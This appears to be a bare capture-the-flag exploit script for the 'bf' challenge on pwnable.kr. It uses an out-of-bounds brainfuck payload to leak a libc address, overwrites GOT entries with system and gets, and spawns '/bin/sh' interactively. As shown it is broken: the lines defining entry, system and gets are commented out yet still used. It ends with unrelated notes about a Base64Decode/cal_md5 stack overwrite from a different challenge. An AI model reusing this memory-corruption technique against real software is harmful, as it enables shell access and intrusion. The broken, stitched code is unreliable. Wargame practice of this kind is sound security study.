from pwn import *
from pwnlib.util.packing import p32
# context(log_level="debug")

p = remote('pwnable.kr', 9002)
# p = process("./bf")
p.recvuntil("")

p.sendline('.'+'<'*0x70+'.>'*4+'<'*4+',>'*4+'<'*36+',>'*4+'>'*24+',>'*4+'.')
p.recv(1)
putchar = p.recv(4)

# libc = ELF('/home/koi/dumpster/pwncache/bf_libc.so')
# base = int.from_bytes(putchar, "little") - libc.symbols['putchar']
# entry = 0x080484e0
# system = base + libc.symbols['system']
# gets = base + libc.symbols['gets']

p.send(p32(entry)+p32(system)+p32(gets))
p.sendline('/bin/sh\x00')
p.interactive()
p.close()

Base64Decode -> var_20ch
cal_md5 <- var_20ch
    -> eax -> var_210h

could be var_20c overwriting stack addr in decode or cal_md5
